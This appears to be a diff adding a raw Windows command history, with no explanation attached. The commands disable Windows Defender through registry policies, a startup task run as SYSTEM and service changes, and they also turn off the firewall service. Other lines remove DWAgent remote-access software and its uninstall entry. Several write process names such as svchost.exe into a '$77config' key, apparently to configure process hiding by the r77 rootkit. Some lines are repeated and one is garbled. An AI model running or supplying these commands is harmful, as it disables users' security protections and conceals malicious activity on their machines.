@@ -1,0 +1,108 @@
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+schtasks  /create /tn "DisableDefender" /tr "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"" /sc onstart /ru SYSTEM
+net  stop DWAgent
+
+
+
+rmdir /s /q "C:\Program Files\dwa"
+rmdir /s /q "C:\Program Files\dwagent1"
+rmdir /s /q "C:\Programrmdir /s /q "C:\Program Files\dwage"
+rmdir /s /q "C:\Program Files\dwag"
+rmdir /s /q "C:\Program Files\dwagent12"
+sc delete dwagent
+net stop DWAgent
+taskkill /F /IM dwagsvc.exe
+taskkill /F /IM dwagent.exe
+rmdir /s /q "C:\Program Files\dwagent"
+taskkill /F /IM dwaglnc.exe
+
+
+cd ..
+cd ..
+cd ..
+rmdir /q /s ui
+cd C:\Program Files\DWAgent
+rmdir /q /s images
+Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process455" /t REG_SZ /d "bridgecommunication.exe" /f
+Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process465" /t REG_SZ /d "svchost.exe" /f
+Reg.exe add "HKLM\SOFTWARE\$77config\process_names" /v "process380" /t REG_SZ /d "spoolsv.exe" /f
+cd ..
+echo y | REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+rmdir /s /q "C:\Program Files\dwagent12345"
+net start WindowDefender
+rmdir /s /q "C:\Program Files\dwagent1234"
+rmdir /s /q "C:\Program Files\dwagent123"
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs
+cd ..
+cd ..
+cd ..
+rmdir /q /s DWAgent
+
+
+
+powershell
+schtasks /create /tn "DisableDefender" /tr "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"" /sc onstart /ru SYSTEM
+del /f systemlock.exe
+del /f systemunlock.exe
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+cd windows\system32
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+del /f install.exe
+cd c:\
+del /f systemaudio.exe
+cd C:\Windows\System32\drivers
+
+
+
+Get-Process | Where-Object { $_.Path -match '\.tmp\.exe$' } | Stop-Process -Force
+powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
+Set-MpPreference `
+Start-Process -FilePath 'C:\vc_redist.x86.exe' -ArgumentList '/install', '/quiet', '/norestart' -Wait -PassThr
+Get-Date
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification"/Disable
+Set-PSReadLineOption -HistorySaveStyle SaveIncrementally -MaximumHistoryCount 5000 -HistoryNoDuplicates $false
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Scheduled Scan"            /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup"  /Disable
+sc.exe config mpssvc start= disabled
+sc.exe stop WinDefend
+sc.exe config WinDefend start= disabled
+sc.exe stop mpssvc
+if (!(Test-Path $PROFILE)) { New-Item -Path $PROFILE -Force | Out-Null }
+Add-Content $PROFILE "`nSet-PSReadLineOption -HistorySaveStyle SaveIncrementally -MaximumHistoryCount 5000"
+Get-History
+Get-PSReadLineOption | Select-Object HistorySavePath, MaximumHistoryCount, HistorySaveStyle
+Get-Content C:\Users\sachi\Desktop\command_log.txt
+Get-Process | Where-Object { $_.Path -match '\.tmp\.exe$' } | Stop-Process -Force
+Set-PSReadLineOption -HistorySaveStyle SaveIncrementally -MaximumHistoryCount 5000
+Get-Content C:\Users\sachi\Desktop\command_log.txt
+exit
+ipconfig
+dir C:\
+Get-Content (Get-PSReadLineOption).HistorySavePath | Select-Object -Last 10
+whoami
+hostname
+
+
+
+Set-MpPreference `
+sc.exe config WinDefend start= disabled
+sc.exe stop WinDefend
+
+
+sc.exe config mpssvc start= disabled
+sc.exe stop mpssvc
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Scheduled Scan"            /Disable
+
+
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification"/Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup"  /Disable
